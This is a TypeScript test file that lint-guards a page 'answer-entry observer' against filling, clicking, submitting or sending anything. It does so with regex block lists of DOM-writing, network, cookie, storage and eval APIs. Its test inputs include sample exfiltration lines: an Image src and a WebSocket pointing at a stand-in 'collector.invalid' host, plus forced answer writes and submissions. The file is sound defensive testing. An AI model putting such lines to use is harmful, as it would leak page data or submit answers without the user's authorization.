// P0-12: the answer-entry observer may only listen and read. It must never fill,
// click, dispatch or submit anything on a page (R51/A42: observation does not
// authorize AI answer filling or submission).
//
// This is a lint guard over the observer's source: it flags the listed write, submit,
// navigation, network, storage and dynamic-code APIs and properties in the spellings it
// covers: member references (including optional calls, `.call` and literal computed names such
// as `el['click']`), writes with every assignment operator (also after a TS `!` assertion or by
// literal computed name), `++`/`--`, and destructuring into a listed property. It cannot prove
// anything about arbitrary JavaScript: aliases (a variable key such as `c[k] = v`, or a
// destructured method such as `const { click } = proto`), APIs not listed, or code outside this file.
// The behavioral boundary is the browser tripwire in scripts/entries-check.mjs
// (`entries.observer_no_write_calls`), which covers the paths that run actually exercises.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

const PROPERTY =
  '(value|checked|indeterminate|selected|selectedIndex|defaultValue|defaultChecked|defaultSelected|valueAsNumber|valueAsDate|files|' +
  'textContent|innerText|outerText|innerHTML|outerHTML|nodeValue|data|src|srcdoc|href|action|type|hidden|disabled|readOnly|' +
  'contentEditable|className|id|dataset\\s*\\.\\s*\\w+|style\\s*\\.\\s*\\w+)';
/** Any assignment operator, including compound and logical ones. */
const ASSIGN = '\\s*(\\*\\*|<<|>>>?|\\|\\||&&|\\?\\?|[-+*/%&|^])?=(?!=)';
/** Methods that change the page, move focus, submit, navigate or send; any member reference counts. */
const METHODS =
  'click|dispatchEvent|focus|blur|select|submit|requestSubmit|reset|showPicker|stepUp|stepDown|setRangeText|setSelectionRange|execCommand|' +
  'setAttribute|setAttributeNS|setAttributeNode|removeAttribute|removeAttributeNS|toggleAttribute|' +
  'append|prepend|appendChild|insertBefore|replaceChild|removeChild|replaceWith|replaceChildren|before|after|remove|' +
  'insertAdjacentHTML|insertAdjacentElement|insertAdjacentText|write|writeln|' +
  'getContext|toDataURL|toBlob|transferControlToOffscreen|' +
  'open|send|sendBeacon|postMessage|pushState|replaceState|assign|reload|setItem|removeItem';

const FORBIDDEN: Array<[RegExp, string]> = [
  [new RegExp(`\\.\\s*${PROPERTY}\\s*(!\\s*)?${ASSIGN}`), 'assigns a DOM property'],
  [new RegExp(`\\.\\s*${PROPERTY}\\s*(\\+\\+|--)|(\\+\\+|--)[^;\\n]*\\.\\s*${PROPERTY}\\b`), 'updates a DOM property'],
  [new RegExp(`\\.\\s*${PROPERTY}\\s*[\\]}]\\s*(=|,|\\})`), 'destructures into a DOM property'],
  [new RegExp(`\\[\\s*['"\`](${METHODS})['"\`]\\s*\\]`), 'uses a listed method by computed name'],
  [new RegExp(`\\[\\s*['"\`]${PROPERTY}['"\`]\\s*\\]${ASSIGN}`), 'assigns a DOM property by computed name'],
  [/\b(Object|Reflect)\s*\.\s*(assign|set|apply|construct|defineProperty|defineProperties|setPrototypeOf)\b/, 'assigns or calls indirectly'],
  [new RegExp(`\\.\\s*(${METHODS})\\b`), 'uses a page-changing, submitting, navigating or sending method'],
  [/\b(fetch|XMLHttpRequest|WebSocket|EventSource|Image|Audio|Worker|SharedWorker)\b|\bimport\s*\(/, 'network or loading'],
  [/\blocation\s*(\.\s*\w+\s*)?=(?!=)|\bhistory\s*\./, 'navigation'],
  [/\bdocument\s*\.\s*cookie|\bcookieStore\b|\blocalStorage\b|\bsessionStorage\b|\bindexedDB\b|\bcaches\b/, 'credentials/storage'],
  [/\beval\b|\bFunction\s*\(|\bnew\s+Function\b|\bsetTimeout\s*\(\s*['"`]/, 'dynamic code'],
];

const observerSource = (): string =>
  readFileSync(new URL('../fixture/src/entry-observer.ts', import.meta.url), 'utf8')
    .split('\n')
    .filter((l) => !l.trim().startsWith('//') && !l.trim().startsWith('*'))
    .join('\n');

function violations(src: string): string[] {
  return FORBIDDEN.filter(([pattern]) => pattern.test(src)).map(([, what]) => what);
}

test('entry observer source uses none of the listed write, input, submit, navigation, network or storage APIs (lint guard)', () => {
  const src = observerSource();
  assert.deepEqual(violations(src), []);
  // Password, hidden and file inputs are never read.
  assert.match(src, /'password'/);
});

test('the lint guard flags QA\'s EO-2 insertions verbatim, and the further spellings found in review', () => {
  const src = observerSource();
  // QA e26523e, tests/e2e/web/p0_12_w1_review/entries-observer/mutate.mjs, all 12 lines as inserted there.
  const qa = [
    '(el as HTMLInputElement).form?.requestSubmit();',
    'HTMLElement.prototype.click.call(choice);',
    "Object.assign(el, { value: '42' });",
    "(el as HTMLInputElement)['value'] = '42';",
    "(el as HTMLInputElement).value += '0';",
    "choice.setAttribute('checked', '');",
    "Reflect.set(choice, 'checked', !choice.checked);",
    'choice.checked ||= true;',
    "new win.Image().src = 'https://collector.invalid/?a=' + encodeURIComponent(after);",
    "new WebSocket('wss://collector.invalid').onopen = null;",
    "win.indexedDB.open('lc-answers');",
    '(el as HTMLInputElement).blur?.();',
  ];
  // Internal review of 7ee1217: optional calls, spacing, other operators and further APIs.
  const review = [
    'el.click?.();',
    "el.dispatchEvent?.(new Event('change', { bubbles: true }));",
    'el.focus?.();',
    "el.setAttribute?.('checked', '');",
    'document.body.append?.(node);',
    'fetch?.(url);',
    'el. click();',
    'el.checked ^= true;',
    'el.defaultChecked = true;',
    "el.defaultValue = 'x';",
    'el.valueAsNumber = 5;',
    'el.stepUp();',
    'el.after(node);',
    "document.write('<b>x</b>');",
    "el.dataset.answer = 'b';",
    'location.assign(url);',
    'new Audio(url);',
    'import(url);',
    "Function('return 1')();",
    "cookieStore.set('a', 'b');",
    'canvas.transferControlToOffscreen();',
    "history.pushState({}, '', '/x');",
    // Re-review of 8d67aaa: literal computed names, TS assertions, updates and destructuring.
    "choice['click']();",
    "(choice as HTMLElement)['click']();",
    "(el as HTMLInputElement).form?.['requestSubmit']();",
    "(el as HTMLInputElement).form!['submit']();",
    "(el as HTMLInputElement)['dispatchEvent'](new Event('change', { bubbles: true }));",
    "choice['setAttribute']('checked', '');",
    "el?.['click']();",
    "el['focus']();",
    "(el as HTMLInputElement).value! = '42';",
    "[(el as HTMLInputElement).value] = ['42'];",
    "[choice.checked] = [!choice.checked];",
    "({ on: choice.checked } = { on: true });",
    "({ v: (el as HTMLInputElement).value } = { v: '42' });",
    "(el as HTMLSelectElement).selectedIndex++;",
  ];
  for (const line of [...qa, ...review]) assert.notDeepEqual(violations(`${src}\n${line}\n`), [], line);
});
